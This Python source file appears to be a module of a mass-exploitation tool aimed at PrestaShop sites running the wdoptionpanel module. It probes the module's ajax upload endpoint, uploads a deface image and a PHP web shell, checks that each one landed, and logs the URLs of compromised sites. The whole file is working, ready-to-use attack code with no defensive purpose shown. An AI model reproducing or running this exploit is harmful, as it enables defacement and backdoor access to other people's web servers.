# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
Jce_Deface_image = 'files/pwn.gif'
ShellPresta = 'files/up.php'


def Exploit(site):
    Exl = site + '/modules/wdoptionpanel/wdoptionpanel_ajax.php'
    try:
        Checkvuln = requests.get('http://' + Exl, timeout=5, headers=Headers)
        if Checkvuln.status_code == 200:
            PostData = {'data': 'bajatax',
                        'type': 'image_upload'}
            FileDataIndex = {'bajatax': open(Jce_Deface_image, 'rb')}
            FileDataShell = {'bajatax': open(ShellPresta, 'rb')}
            uploadedPathIndex = site + '/modules/wdoptionpanel/upload/' + Jce_Deface_image.split('/')[1]
            uploadedPathShell = site + '/modules/wdoptionpanel/upload/' + ShellPresta.split('/')[1]
            requests.post('http://' + Exl, files=FileDataIndex, data=PostData, timeout=5, headers=Headers)
            CheckIndex = requests.get('http://' + uploadedPathIndex, timeout=5, headers=Headers)
            if 'GIF89a' in CheckIndex.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(uploadedPathIndex + '\n')
                requests.post('http://' + Exl, files=FileDataShell, data=PostData, timeout=5, headers=Headers)
                Checkshell = requests.get('http://' + uploadedPathShell, timeout=5, headers=Headers)
                if 'Vuln!!' in Checkshell.content:
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(uploadedPathShell + '\n')
                return printModule.returnYes(site, 'N/A', 'wdoptionpanel Module', 'Prestashop')
            else:
                return printModule.returnNo(site, 'N/A', 'wdoptionpanel Module', 'Prestashop')
        else:
            return printModule.returnNo(site, 'N/A', 'wdoptionpanel Module', 'Prestashop')
    except:
        return printModule.returnNo(site, 'N/A', 'wdoptionpanel Module', 'Prestashop')